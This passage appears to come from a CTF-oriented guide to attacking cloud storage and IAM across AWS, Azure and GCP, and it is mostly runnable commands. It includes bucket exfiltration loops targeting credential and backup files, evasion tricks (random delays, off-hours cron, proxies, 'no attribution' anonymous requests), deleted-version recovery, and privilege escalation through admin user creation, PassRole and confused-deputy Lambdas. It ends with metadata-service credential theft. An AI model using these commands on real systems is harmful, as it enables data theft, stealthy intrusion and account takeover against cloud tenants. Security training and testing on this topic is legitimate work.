+# Selective exfiltration (high-value files)
+aws s3 ls s3://target-bucket --recursive --no-sign-request | \
+  grep -E "\.sql|\.bak|\.zip|\.tar\.gz|password|secret|credential|key" | \
+  awk '{print $NF}' | \
+  while read file; do
+    aws s3 cp "s3://target-bucket/$file" ./sensitive/ --no-sign-request
+  done
+```
+
+**Stealth Exfiltration Techniques** [Inference - methods to avoid detection]
+
+```bash
+# Throttled download (avoid rate-based alerts)
+aws s3 ls s3://target-bucket --recursive --no-sign-request | \
+  awk '{print $NF}' | \
+  while read file; do
+    aws s3 cp "s3://target-bucket/$file" ./data/ --no-sign-request
+    sleep $((RANDOM % 60 + 30))  # Random delay 30-90 seconds
+  done
+
+# Time-based exfiltration (off-hours)
+# Schedule downloads for nights/weekends via cron
+0 2 * * * /usr/local/bin/exfiltrate-s3.sh
+
+# Proxy through multiple IPs (if using authenticated access)
+# Use VPN/proxy rotation to distribute requests
+
+# Small file targeting (less likely to trigger alerts)
+aws s3 ls s3://target-bucket --recursive --no-sign-request | \
+  awk '{if ($3 < 10485760) print $NF}' | \
+  while read file; do
+    aws s3 cp "s3://target-bucket/$file" ./data/ --no-sign-request
+  done
+```
+
+---
+
+**Critical Related Topics:**
+
+- **Object versioning exploitation** (accessing deleted/overwritten file versions)
+- **Server-side encryption bypass** (SSE-C key manipulation, KMS key access)
+- **Cross-origin resource sharing (CORS) on storage** (misconfigured CORS policies)
+- **Storage event triggers** (Lambda/Function exploitation via S3 events)
+- **CDN cache poisoning via storage** (CloudFront/CDN misconfigurations)
+
+---
+
+Cloud storage services (AWS S3, Azure Blob Storage, Google Cloud Storage) present significant attack surfaces in CTF challenges and real-world scenarios. This module covers exploitation techniques specific to cloud object storage misconfigurations and design flaws.
+
+## Pre-signed URL Abuse
+
+Pre-signed URLs are time-limited, cryptographically signed URLs that grant temporary access to private cloud storage objects without requiring authentication credentials.
+
+### Attack Methodology
+
+**Reconnaissance and Discovery:**
+
+```bash
+# Extract pre-signed URLs from web traffic
+burpsuite # Intercept HTTP requests
+grep -r "X-Amz-Signature" /path/to/logs
+grep -r "sig=" /path/to/logs  # Azure Blob Storage
+grep -r "Signature=" /path/to/logs  # Google Cloud Storage
+
+# AWS S3 pre-signed URL structure
+https://bucket-name.s3.amazonaws.com/object-key?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=...&X-Amz-Date=...&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=...
+```
+
+**Parameter Manipulation:**
+
+```bash
+# Attempt to extend expiration (typically fails but worth testing)
+# Modify X-Amz-Expires parameter
+curl "https://bucket.s3.amazonaws.com/file.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Expires=999999&..."
+
+# Test for signature bypass
+curl -X GET "https://bucket.s3.amazonaws.com/file.txt" \
+  --header "Host: bucket.s3.amazonaws.com"
+```
+
+**Path Traversal Attempts:**
+
+```bash
+# If pre-signed URL grants access to one object, test for directory traversal
+# Original URL: https://bucket.s3.amazonaws.com/public/document.pdf?signature...
+curl "https://bucket.s3.amazonaws.com/private/secrets.txt?signature..."
+curl "https://bucket.s3.amazonaws.com/../admin/config.yaml?signature..."
+
+# Enumerate adjacent objects by modifying object key
+for i in {1..100}; do
+  curl -o "file_$i.txt" "https://bucket.s3.amazonaws.com/files/document_$i.pdf?X-Amz-Signature=..."
+done
+```
+
+**Method Manipulation:**
+
+```bash
+# Pre-signed URL may be scoped to GET only
+# Test other HTTP methods
+curl -X PUT "https://bucket.s3.amazonaws.com/object.txt?signature..." \
+  --data "malicious content"
+
+curl -X DELETE "https://bucket.s3.amazonaws.com/object.txt?signature..."
+
+curl -X POST "https://bucket.s3.amazonaws.com/object.txt?signature..." \
+  --data "additional data"
+```
+
+**Timing and Replay Attacks:**
+
+```bash
+# Capture valid pre-signed URL
+# Replay after expiration to test clock skew tolerance
+curl -v "https://bucket.s3.amazonaws.com/object.txt?X-Amz-Signature=..."
+
+# AWS typically allows 15-minute clock skew [Inference: based on standard AWS behavior]
+# Test URLs immediately before and after stated expiration
+```
+
+### Tools for Pre-signed URL Exploitation
+
+**AWS CLI Techniques:**
+
+```bash
+# Generate your own pre-signed URLs if you have credentials
+aws s3 presign s3://bucket-name/object-key --expires-in 3600
+
+# Test bucket permissions directly
+aws s3 ls s3://extracted-bucket-name --no-sign-request
+
+# Attempt anonymous access
+aws s3 cp s3://bucket-name/object-key . --no-sign-request
+```
+
+**Cloud_enum for Discovery:**
+
+```bash
+# Install
+git clone https://github.com/initstring/cloud_enum
+cd cloud_enum
+pip3 install -r requirements.txt
+
+# Enumerate S3 buckets
+python3 cloud_enum.py -k target-company
+
+# Check specific bucket
+python3 cloud_enum.py -k specific-bucket-name --quickscan
+```
+
+**S3Scanner:**
+
+```bash
+# Install
+pip3 install s3scanner
+
+# Scan for open buckets
+s3scanner scan --buckets bucket-list.txt
+
+# Dump accessible content
+s3scanner dump --bucket target-bucket
+```
+
+### Azure Blob Storage Pre-signed URLs (SAS Tokens)
+
+```bash
+# Azure SAS token structure
+https://storageaccount.blob.core.windows.net/container/blob?sv=2021-06-08&ss=b&srt=sco&sp=r&se=2024-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=signature_here
+
+# Key parameters:
+# sv = storage version
+# sp = permissions (r=read, w=write, d=delete, l=list)
+# se = expiry time
+# sig = signature
+
+# Test permission escalation
+# Modify sp parameter from 'r' to 'rw' or 'rwdl'
+curl "https://account.blob.core.windows.net/container/blob?sp=rwdl&sig=..."
+
+# Enumerate containers
+az storage blob list --account-name targetaccount \
+  --container-name targetcontainer \
+  --sas-token "?sv=2021-06-08&sp=r..."
+```
+
+## Cross-Account Access
+
+Cross-account access vulnerabilities arise from misconfigured IAM policies, bucket policies, or trust relationships that allow unintended principals to access cloud resources.
+
+### AWS S3 Cross-Account Exploitation
+
+**Bucket Policy Enumeration:**
+
+```bash
+# Check if bucket policy is publicly readable
+aws s3api get-bucket-policy --bucket target-bucket --no-sign-request
+
+# Common misconfiguration: wildcard principal
+# Vulnerable policy example (DO NOT use in production):
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": "*",
+    "Action": "s3:GetObject",
+    "Resource": "arn:aws:s3:::bucket-name/*"
+  }]
+}
+
+# Test access from your AWS account
+aws s3 ls s3://target-bucket --profile your-profile
+aws s3 cp s3://target-bucket/file.txt . --profile your-profile
+```
+
+**ACL Exploitation:**
+
+```bash
+# Check bucket ACL
+aws s3api get-bucket-acl --bucket target-bucket
+
+# Check object ACL
+aws s3api get-object-acl --bucket target-bucket --key object-key
+
+# Common misconfiguration: AuthenticatedUsers group
+# This grants access to ANY AWS authenticated user
+# Test with your AWS credentials
+aws s3 cp s3://target-bucket/secret.txt . --profile attacker-profile
+
+# Attempt to modify ACLs if you have access
+aws s3api put-object-acl --bucket target-bucket \
+  --key object.txt \
+  --acl public-read
+```
+
+**Bucket Takeover via Account ID:**
+
+```bash
+# If you discover an AWS account ID in configurations
+# Format: 123456789012 (12 digits)
+
+# Create bucket policy in your account that trusts their account
+# Then test if their resources trust your account
+
+# Enumerate their public resources
+aws s3 ls s3://company-name-bucket --profile your-profile
+```
+
+### Tools for Cross-Account Discovery
+
+**S3Scanner Advanced Usage:**
+
+```bash
+# Check for cross-account access patterns
+s3scanner scan --buckets targets.txt --public
+
+# Test authenticated access
+AWS_PROFILE=your-profile s3scanner scan --buckets targets.txt
+
+# Dump all accessible objects
+s3scanner dump --bucket target-bucket --dump-dir ./output
+```
+
+**Pacu (AWS Exploitation Framework):**
+
+```bash
+# Install
+git clone https://github.com/RhinoSecurityLabs/pacu
+cd pacu
+bash install.sh
+
+# Run Pacu
+python3 pacu.py
+
+# Import keys
+set_keys
+# Enter your AWS access keys
+
+# Enumerate S3 permissions
+run s3__bucket_finder
+
+# Test cross-account access
+run iam__enum_permissions
+
+# Escalate privileges if possible
+run iam__privesc_scan
+```
+
+**ScoutSuite (Multi-Cloud Auditing):**
+
+```bash
+# Install
+pip install scoutsuite
+
+# Audit AWS account
+scout aws --profile your-profile
+
+# Focus on S3 findings
+scout aws --services s3 --profile your-profile
+
+# Output includes misconfigurations and cross-account risks
+# Review report.html for detailed findings
+```
+
+### Azure Cross-Account (Cross-Tenant) Access
+
+```bash
+# List accessible storage accounts
+az storage account list
+
+# Check for overly permissive role assignments
+az role assignment list --all
+
+# Test anonymous blob access
+curl "https://storageaccount.blob.core.windows.net/container/blob"
+
+# Enumerate with authenticated context
+az storage blob list \
+  --account-name targetaccount \
+  --container-name container \
+  --auth-mode login
+```
+
+**MicroBurst (Azure Exploitation):**
+
+```bash
+# Install
+git clone https://github.com/NetSPI/MicroBurst
+cd MicroBurst
+Import-Module .\MicroBurst.psm1
+
+# Enumerate Azure storage
+Invoke-EnumerateAzureBlobs -Base company-name
+
+# Check for public storage accounts
+Get-AzureStorageAccount | Where-Object {$_.EnableHttpsTrafficOnly -eq $false}
+```
+
+## Object Versioning Exploitation
+
+Many cloud storage services maintain previous versions of objects. Misconfigurations or lack of proper access controls on versioned objects can expose sensitive historical data.
+
+### AWS S3 Versioning Attacks
+
+**Check if Versioning is Enabled:**
+
+```bash
+# Check bucket versioning status
+aws s3api get-bucket-versioning --bucket target-bucket
+
+# Output examples:
+# {"Status": "Enabled"} - versioning active
+# {"Status": "Suspended"} - versioning was enabled, objects retain versions
+# No output or empty - versioning never enabled
+```
+
+**Enumerate Object Versions:**
+
+```bash
+# List all versions of all objects
+aws s3api list-object-versions --bucket target-bucket
+
+# List versions of specific object
+aws s3api list-object-versions \
+  --bucket target-bucket \
+  --prefix "path/to/object.txt"
+
+# Output includes VersionId for each version
+# Example response structure:
+{
+  "Versions": [
+    {
+      "Key": "secret.txt",
+      "VersionId": "3HL4kqtJlcpXroDTDmJ+rmSpXd3dIbrHY",
+      "IsLatest": true,
+      "LastModified": "2024-10-20T12:00:00Z"
+    },
+    {
+      "Key": "secret.txt",
+      "VersionId": "QUpfdndhfd8438DJDNF3jf9JFJjf",
+      "IsLatest": false,
+      "LastModified": "2024-10-15T08:30:00Z"
+    }
+  ]
+}
+```
+
+**Download Previous Versions:**
+
+```bash
+# Download specific version
+aws s3api get-object \
+  --bucket target-bucket \
+  --key secret.txt \
+  --version-id "QUpfdndhfd8438DJDNF3jf9JFJjf" \
+  old-version-secret.txt
+
+# Automated version extraction
+aws s3api list-object-versions --bucket target-bucket \
+  | jq -r '.Versions[] | "\(.Key) \(.VersionId)"' \
+  | while read key version; do
+      aws s3api get-object \
+        --bucket target-bucket \
+        --key "$key" \
+        --version-id "$version" \
+        "versions/${key}_${version}"
+    done
+```
+
+**Delete Markers Exploitation:**
+
+```bash
+# List delete markers (objects marked as deleted but versions retained)
+aws s3api list-object-versions --bucket target-bucket \
+  | jq '.DeleteMarkers'
+
+# Recover "deleted" files by removing delete marker
+aws s3api delete-object \
+  --bucket target-bucket \
+  --key recovered-file.txt \
+  --version-id "delete-marker-version-id"
+
+# This exposes the previous version
+```
+
+**Version-Specific Access Control Testing:**
+
+```bash
+# Current object may have restricted access
+# Previous versions might have different ACLs
+
+# Check ACL of specific version
+aws s3api get-object-acl \
+  --bucket target-bucket \
+  --key object.txt \
+  --version-id "old-version-id"
+
+# Download if old version has weaker permissions
+aws s3api get-object \
+  --bucket target-bucket \
+  --key object.txt \
+  --version-id "old-version-id" \
+  output.txt \
+  --no-sign-request
+```
+
+### Azure Blob Versioning
+
+```bash
+# Check if versioning is enabled
+az storage account blob-service-properties show \
+  --account-name targetaccount \
+  --query "isVersioningEnabled"
+
+# List blob versions
+az storage blob list \
+  --account-name targetaccount \
+  --container-name container \
+  --include v \
+  --auth-mode login
+
+# Download specific version
+az storage blob download \
+  --account-name targetaccount \
+  --container-name container \
+  --name blob.txt \
+  --version-id "2024-10-20T12:00:00.0000000Z" \
+  --file old-blob.txt
+```
+
+### Google Cloud Storage Versioning
+
+```bash
+# Check if versioning enabled
+gsutil versioning get gs://bucket-name
+
+# List object versions
+gsutil ls -a gs://bucket-name/object.txt
+
+# Download specific generation
+gsutil cp gs://bucket-name/object.txt#1634567890123456 ./old-version.txt
+
+# Restore old version
+gsutil cp gs://bucket-name/object.txt#1634567890123456 gs://bucket-name/object.txt
+```
+
+### Automated Versioning Enumeration Script
+
+```bash
+#!/bin/bash
+# s3-version-dump.sh - Extract all versions from S3 bucket
+
+BUCKET=$1
+OUTPUT_DIR="versions_${BUCKET}_$(date +%Y%m%d_%H%M%S)"
+
+mkdir -p "$OUTPUT_DIR"
+
+echo "[*] Enumerating versions in bucket: $BUCKET"
+
+aws s3api list-object-versions --bucket "$BUCKET" > "${OUTPUT_DIR}/versions.json"
+
+echo "[*] Extracting version data..."
+
+jq -r '.Versions[] | "\(.Key)|\(.VersionId)|\(.LastModified)"' "${OUTPUT_DIR}/versions.json" > "${OUTPUT_DIR}/version_list.txt"
+
+echo "[*] Downloading all versions..."
+
+while IFS='|' read -r key version_id modified; do
+  safe_key=$(echo "$key" | tr '/' '_')
+  output_file="${OUTPUT_DIR}/${safe_key}_${version_id}"
+  
+  echo "[+] Downloading: $key (Version: $version_id, Modified: $modified)"
+  
+  aws s3api get-object \
+    --bucket "$BUCKET" \
+    --key "$key" \
+    --version-id "$version_id" \
+    "$output_file" 2>/dev/null
+    
+  if [ $? -eq 0 ]; then
+    echo "    [SUCCESS] Saved to: $output_file"
+  else
+    echo "    [FAILED] Access denied or error"
+  fi
+done < "${OUTPUT_DIR}/version_list.txt"
+
+echo "[*] Version dump complete. Output directory: $OUTPUT_DIR"
+```
+
+**Usage:**
+
+```bash
+chmod +x s3-version-dump.sh
+./s3-version-dump.sh target-bucket-name
+```
+
+### Version Exploitation Strategy
+
+**Typical Attack Workflow:**
+
+1. **Discovery**: Identify bucket with versioning enabled
+2. **Enumeration**: List all object versions using `list-object-versions`
+3. **Permission Testing**: Check if older versions have weaker ACLs
+4. **Historical Data Mining**: Download all versions looking for:
+    - Accidentally committed credentials
+    - Configuration files with old passwords
+    - Source code with vulnerabilities
+    - Sensitive data that was "deleted"
+5. **Delete Marker Recovery**: Undelete objects by removing delete markers
+
+**Common Scenarios:**
+
+- Developer commits AWS keys to config file, then "deletes" file → old version still accessible
+- Company removes sensitive document from bucket → delete marker present, original version retrievable
+- Object permissions tightened on current version → old versions retain public access
+- Backup files with `_old` or `_backup` suffixes retain older versions with sensitive data
+
+### Defense Evasion Considerations
+
+[Inference] When exploiting cloud storage in CTF scenarios, standard detection mechanisms include CloudTrail logging (AWS), Activity Logs (Azure), and Cloud Audit Logs (GCP). Enumeration and download activities generate events, though detection depends on proper logging configuration and monitoring.
+
+**Operational Tips:**
+
+```bash
+# Use --no-sign-request for anonymous access (no attribution)
+aws s3 cp s3://bucket/file.txt . --no-sign-request
+
+# Throttle requests to avoid rate-limiting alarms
+for file in $(cat files.txt); do
+  aws s3 cp "s3://bucket/${file}" .
+  sleep 5
+done
+
+# Use proxies or VPNs to obscure source IP
+# Configure AWS CLI to use proxy
+export HTTP_PROXY=http://proxy:8080
+export HTTPS_PROXY=http://proxy:8080
+```
+
+---
+
+**Related Topics for Deep Dive**
+
+For comprehensive cloud exploitation capabilities, consider studying:
+
+- **IAM Policy Exploitation**: Privilege escalation through policy manipulation
+- **Metadata Service Attacks**: SSRF to instance metadata endpoints (169.254.169.254)
+- **Cloud Function/Lambda Exploitation**: Serverless injection and persistence
+- **CloudTrail/Logging Evasion**: Anti-forensics in cloud environments
+
+---
+
+# IAM & Privilege Escalation
+
+## Role Enumeration
+
+Role enumeration is the systematic discovery and analysis of IAM roles, their permissions, and relationships within a cloud environment to identify privilege escalation vectors.
+
+### AWS Role Enumeration
+
+**Core Enumeration Commands:**
+
+```bash
+# List all roles in the account
+aws iam list-roles
+
+# Get detailed role information
+aws iam get-role --role-name <role-name>
+
+# List policies attached to a role
+aws iam list-attached-role-policies --role-name <role-name>
+
+# List inline policies for a role
+aws iam list-role-policies --role-name <role-name>
+
+# Get inline policy document
+aws iam get-role-policy --role-name <role-name> --policy-name <policy-name>
+
+# Get managed policy version
+aws iam get-policy-version --policy-arn <policy-arn> --version-id <version-id>
+```
+
+**Trust Relationship Analysis:**
+
+```bash
+# Extract trust policy from role
+aws iam get-role --role-name <role-name> --query 'Role.AssumeRolePolicyDocument'
+
+# Check which principals can assume the role
+aws iam get-role --role-name <role-name> | jq '.Role.AssumeRolePolicyDocument.Statement[].Principal'
+```
+
+**Automated Enumeration Tools:**
+
+```bash
+# Using enumerate-iam (identifies available permissions)
+git clone https://github.com/andresriancho/enumerate-iam
+cd enumerate-iam
+./enumerate-iam.py --access-key <key> --secret-key <secret>
+
+# Using ScoutSuite for comprehensive role analysis
+scout suite aws --no-browser --report-dir ./scout-report
+
+# Using Pacu for role enumeration
+pacu
+run iam__enum_permissions
+run iam__enum_roles
+run iam__bruteforce_permissions
+```
+
+**Key Enumeration Targets:**
+
+- Roles with `sts:AssumeRole` permissions
+- Roles attachable to EC2 instances (`ec2.amazonaws.com` in trust policy)
+- Roles with wildcard permissions (`*`)
+- Roles with `iam:PassRole` capability
+- Cross-account roles (external account IDs in trust policies)
+- Service-linked roles
+
+**Permission Mapping Technique:**
+
+```bash
+# Test individual permissions against a role
+aws sts assume-role --role-arn <role-arn> --role-session-name test
+
+# Use temporary credentials to enumerate permissions
+export AWS_ACCESS_KEY_ID=<temp-key>
+export AWS_SECRET_ACCESS_KEY=<temp-secret>
+export AWS_SESSION_TOKEN=<temp-token>
+
+# Test specific actions
+aws iam list-users
+aws s3 ls
+aws ec2 describe-instances
+```
+
+### Azure Role Enumeration
+
+**Azure Role Discovery:**
+
+```bash
+# List all role assignments for subscription
+az role assignment list --all
+
+# Get role definition details
+az role definition list --name "Contributor"
+
+# List custom roles
+az role definition list --custom-role-only true
+
+# Get service principal roles
+az ad sp list --all --query "[].{Name:displayName, AppId:appId}"
+
+# Check role assignments for specific principal
+az role assignment list --assignee <object-id>
+```
+
+**Managed Identity Enumeration:**
+
+```bash
+# From inside Azure VM, query metadata service
+curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# List VMs with managed identities
+az vm identity show --name <vm-name> --resource-group <rg-name>
+
+# Get managed identity permissions
+az role assignment list --assignee <managed-identity-principal-id>
+```
+
+**Azure AD Role Enumeration:**
+
+```bash
+# List directory roles
+az ad sp list --all --query "[].{Name:displayName, Roles:appRoles[].value}"
+
+# Using AzureHound for comprehensive enumeration
+azurehound -u <username> -p <password> -t <tenant-id> list --all
+
+# Using ROADtools
+roadrecon auth -u <username> -p <password>
+roadrecon gather
+roadrecon gui
+```
+
+### GCP Role Enumeration
+
+**GCP IAM Enumeration:**
+
+```bash
+# List all IAM policies
+gcloud projects get-iam-policy <project-id>
+
+# List service accounts
+gcloud iam service-accounts list
+
+# Get service account IAM policy
+gcloud iam service-accounts get-iam-policy <sa-email>
+
+# List roles granted to a member
+gcloud projects get-iam-policy <project-id> --flatten="bindings[].members" --filter="bindings.members:<member>"
+
+# List custom roles
+gcloud iam roles list --project=<project-id>
+
+# Describe specific role
+gcloud iam roles describe <role-name>
+```
+
+**Service Account Key Enumeration:**
+
+```bash
+# List keys for service account
+gcloud iam service-accounts keys list --iam-account=<sa-email>
+
+# Test service account permissions
+gcloud auth activate-service-account --key-file=<key-file>
+gcloud projects get-iam-policy <project-id>
+```
+
+## Permission Boundary Bypass
+
+Permission boundaries set maximum permissions that an IAM entity can have, but misconfigurations can allow bypasses.
+
+### AWS Permission Boundary Analysis
+
+**Understanding Permission Boundaries:**
+
+Permission boundaries use managed policies to define the maximum permissions. The effective permissions are the intersection of identity-based policies AND permission boundaries.
+
+```bash
+# Check if a user/role has a permission boundary
+aws iam get-user --user-name <user-name> | jq '.User.PermissionsBoundary'
+aws iam get-role --role-name <role-name> | jq '.Role.PermissionsBoundary'
+
+# Get permission boundary policy content
+aws iam get-policy --policy-arn <boundary-arn>
+aws iam get-policy-version --policy-arn <boundary-arn> --version-id <version-id>
+```
+
+**Common Bypass Vectors:**
+
+**1. Missing Boundary on New Entity Creation:**
+
+If IAM permissions allow creating users/roles without applying boundaries:
+
+```bash
+# Create user without boundary (if iam:CreateUser allowed but no boundary enforcement)
+aws iam create-user --user-name bypass-user
+
+# Attach admin policy
+aws iam attach-user-policy --user-name bypass-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Create access keys
+aws iam create-access-key --user-name bypass-user
+```
+
+**2. Permission Boundary Modification:**
+
+```bash
+# Check if you can delete permission boundaries
+aws iam delete-user-permissions-boundary --user-name <user>
+
+# Check if you can modify the boundary policy itself
+aws iam create-policy-version --policy-arn <boundary-arn> --policy-document file://permissive-policy.json --set-as-default
+```
+
+**3. PassRole to Service Without Boundary:**
+
+```bash
+# Pass role to Lambda without boundary enforcement
+aws lambda create-function \
+  --function-name privesc-function \
+  --runtime python3.9 \
+  --role arn:aws:iam::<account>:role/HighPrivilegeRole \
+  --handler lambda_function.lambda_handler \
+  --zip-file fileb://function.zip
+
+# Invoke function to execute with higher privileges
+aws lambda invoke --function-name privesc-function output.txt
+```
+
+**4. Service-Specific Boundary Gaps:**
+
+[Inference] Some AWS services may not enforce permission boundaries consistently. Testing required for specific services.
+
+```bash
+# CloudFormation role passing
+aws cloudformation create-stack \
+  --stack-name privesc-stack \
+  --template-body file://template.yaml \
+  --role-arn arn:aws:iam::<account>:role/HighPrivilegeRole
+
+# CodeBuild project creation
+aws codebuild create-project \
+  --name privesc-build \
+  --service-role arn:aws:iam::<account>:role/HighPrivilegeRole \
+  --source type=NO_SOURCE \
+  --artifacts type=NO_ARTIFACTS \
+  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:5.0,computeType=BUILD_GENERAL1_SMALL
+```
+
+### Azure Permission Boundary Equivalents
+
+Azure uses resource locks and policy assignments rather than explicit permission boundaries:
+
+**Azure Policy Bypass Techniques:**
+
+```bash
+# Check applied policies
+az policy assignment list --resource-group <rg>
+
+# Test policy exemptions
+az policy exemption create \
+  --name test-exemption \
+  --policy-assignment <assignment-id> \
+  --exemption-category Waiver
+
+# Check for management group hierarchy gaps
+az account management-group list
+az account management-group show --name <mg-name>
+```
+
+**Azure RBAC Deny Assignments:**
+
+```bash
+# List deny assignments (rare, mostly system-managed)
+az role assignment list --all --query "[?type=='Microsoft.Authorization/denyAssignments']"
+
+# Attempt privileged operations outside deny scope
+az resource create --resource-type <type> --name <name> --resource-group <different-rg>
+```
+
+### GCP Organization Policy Bypass
+
+**Policy Constraint Analysis:**
+
+```bash
+# List organization policies
+gcloud resource-manager org-policies list --project=<project-id>
+
+# Describe specific constraint
+gcloud resource-manager org-policies describe <constraint> --project=<project-id>
+
+# Test if policies apply at folder vs project level
+gcloud resource-manager org-policies describe <constraint> --folder=<folder-id>
+```
+
+**Bypass Through Project Creation:**
+
+```bash
+# Create new project outside policy scope
+gcloud projects create <new-project-id> --folder=<folder-id>
+
+# Check if policies inherited
+gcloud resource-manager org-policies list --project=<new-project-id>
+```
+
+## AssumeRole Exploitation
+
+AssumeRole allows principals to temporarily gain permissions of another role through STS token generation.
+
+### AWS AssumeRole Attack Chains
+
+**Basic AssumeRole Exploitation:**
+
+```bash
+# Assume role with basic trust relationship
+aws sts assume-role \
+  --role-arn arn:aws:iam::<account>:role/<role-name> \
+  --role-session-name exploit-session
+
+# Extract and export credentials
+export AWS_ACCESS_KEY_ID=<AccessKeyId>
+export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
+export AWS_SESSION_TOKEN=<SessionToken>
+
+# Verify assumed identity
+aws sts get-caller-identity
+```
+
+**AssumeRole Chaining:**
+
+```bash
+# Chain through multiple roles for privilege escalation
+# Role A -> Role B -> Role C (admin)
+
+# Step 1: Assume Role A
+aws sts assume-role --role-arn arn:aws:iam::111111111111:role/RoleA --role-session-name step1
+
+# Step 2: Use Role A credentials to assume Role B
+export AWS_ACCESS_KEY_ID=<RoleA-Key>
+export AWS_SECRET_ACCESS_KEY=<RoleA-Secret>
+export AWS_SESSION_TOKEN=<RoleA-Token>
+
+aws sts assume-role --role-arn arn:aws:iam::222222222222:role/RoleB --role-session-name step2
+
+# Step 3: Continue chain
+export AWS_ACCESS_KEY_ID=<RoleB-Key>
+export AWS_SECRET_ACCESS_KEY=<RoleB-Secret>
+export AWS_SESSION_TOKEN=<RoleB-Token>
+
+aws sts assume-role --role-arn arn:aws:iam::333333333333:role/AdminRole --role-session-name final
+```
+
+**Cross-Account AssumeRole:**
+
+```bash
+# Assume role in different account
+aws sts assume-role \
+  --role-arn arn:aws:iam::123456789012:role/CrossAccountRole \
+  --role-session-name cross-account-session \
+  --external-id <external-id-if-required>
+
+# Enumerate cross-account trust relationships
+aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS]].{RoleName:RoleName,TrustedAccounts:AssumeRolePolicyDocument.Statement[].Principal.AWS}'
+```
+
+**Confused Deputy Exploitation:**
+
+When a service is trusted to assume roles, you can abuse that service to assume roles on your behalf:
+
+```bash
+# Example: Lambda confused deputy
+# Create Lambda with execution role that can assume target role
+aws lambda create-function \
+  --function-name assume-role-proxy \
+  --runtime python3.9 \
+  --role arn:aws:iam::<account>:role/LambdaExecutionRole \
+  --handler lambda_function.lambda_handler \
+  --zip-file fileb://assume_role.zip
+
+# Lambda code (assume_role.zip):
+```
+
+```python
+import boto3
+import json
+
+def lambda_handler(event, context):
+    sts = boto3.client('sts')
+    response = sts.assume_role(
+        RoleArn='arn:aws:iam::<account>:role/TargetRole',
+        RoleSessionName='confused-deputy-session'
+    )
+    return {
+        'statusCode': 200,
+        'body': json.dumps(response['Credentials'])
+    }
+```
+
+```bash
+# Invoke to get target role credentials
+aws lambda invoke --function-name assume-role-proxy output.json
+cat output.json
+```
+
+**AssumeRole with MFA Bypass:**
+
+If MFA is required but not properly enforced:
+
+```bash
+# Check MFA requirements in trust policy
+aws iam get-role --role-name <role> | jq '.Role.AssumeRolePolicyDocument.Statement[].Condition'
+
+# Attempt assume-role without MFA if condition checking is flawed
+aws sts assume-role --role-arn <role-arn> --role-session-name test
+
+# If MFA required, try with session token from different authentication
+aws sts assume-role \
+  --role-arn <role-arn> \
+  --role-session-name test \
+  --serial-number arn:aws:iam::<account>:mfa/<user> \
+  --token-code <mfa-code>
+```
+
+**AssumeRoleWithWebIdentity Exploitation:**
+
+```bash
+# Abuse OIDC provider trust
+aws sts assume-role-with-web-identity \
+  --role-arn arn:aws:iam::<account>:role/WebIdentityRole \
+  --role-session-name web-session \
+  --web-identity-token <jwt-token>
+
+# Enumerate OIDC providers
+aws iam list-open-id-connect-providers
+
+# Get OIDC provider details
+aws iam get-open-id-connect-provider --open-id-connect-provider-arn <oidc-arn>
+```
+
+### Azure Role Assignment Exploitation
+
+**Azure Service Principal AssumeRole Equivalent:**
+
+```bash
+# Authenticate as service principal
+az login --service-principal \
+  -u <app-id> \
+  -p <password-or-cert> \
+  --tenant <tenant-id>
+
+# Get access token for different resource
+az account get-access-token --resource https://graph.microsoft.com
+
+# Use token with REST API
+curl -H "Authorization: Bearer <token>" https://graph.microsoft.com/v1.0/me
+```
+
+**Managed Identity Token Acquisition:**
+
+```bash
+# From Azure VM/App Service
+curl -H Metadata:true \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# Specify user-assigned managed identity
+curl -H Metadata:true \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<client-id>"
+
+# Get token for different resource (e.g., Key Vault)
+curl -H Metadata:true \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
+```
+
+**Azure Role Assignment Through Resource Creation:**
+
+```bash
+# Create resource with contributor role to gain permissions
+az vm create \
+  --name privesc-vm \
+  --resource-group <rg> \
+  --image UbuntuLTS \
+  --assign-identity \
+  --role Contributor \
+  --scope /subscriptions/<subscription-id>
+
+# Access VM and use managed identity
+ssh azureuser@<vm-ip>
+curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+```
+
+### GCP Service Account Impersonation Setup
+
+**Basic Service Account Token Generation:**
+
+```bash
+# Generate access token for service account
+gcloud auth activate-service-account --key-file=<key-file>
+
+# Get access token
+gcloud auth print-access-token
+
+# Generate ID token
+gcloud auth print-identity-token
+```
+
+**Service Account Key Creation (Privilege Escalation):**
+
+```bash
+# If you have iam.serviceAccountKeys.create permission
+gcloud iam service-accounts keys create key.json \
+  --iam-account=<sa-email>
+
+# Activate and use
+gcloud auth activate-service-account --key-file=key.json
+```
+
+**ActAs Permission Exploitation:**
+
+```bash
+# Check if you can impersonate service account
+gcloud iam service-accounts get-iam-policy <sa-email> \
+  --filter="bindings.role:roles/iam.serviceAccountUser"
+
+# Generate access token for impersonated account
+gcloud auth print-access-token --impersonate-service-account=<sa-email>
+
+# Use impersonated credentials for operations
+gcloud projects get-iam-policy <project-id> \
+  --impersonate-service-account=<sa-email>
+```
+
+## Service Account Impersonation
+
+Service account impersonation allows one principal to act as another service account, effectively gaining its permissions.
+
+### AWS Service Account Impersonation Patterns
+
+AWS doesn't use "service accounts" in the traditional sense, but EC2 instance profiles and Lambda execution roles serve similar functions.
+
+**EC2 Instance Metadata Abuse:**
+
+```bash
+# From compromised EC2 instance
+# Query instance metadata for IAM role credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Get role name
+ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+
+# Retrieve temporary credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
